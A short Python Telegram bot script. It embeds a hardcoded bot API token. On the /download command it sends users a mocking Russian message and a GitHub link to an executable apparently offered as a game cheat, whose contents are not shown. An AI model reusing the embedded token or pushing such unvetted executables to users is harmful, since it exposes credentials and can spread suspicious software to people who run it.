import telebot

bot = telebot.TeleBot('8752873368:AAElnIRXyF8sGUP0yTpaP80t6kn_nf3rPt0')

@bot.message_handler(commands=['download'])
def start(message):
    bot.send_message(message.chat.id, "скачал? теперь удаляй: https://github.com/dinaq5080-cyber/gaysex/blob/main/gamesense.exe")

bot.polling()
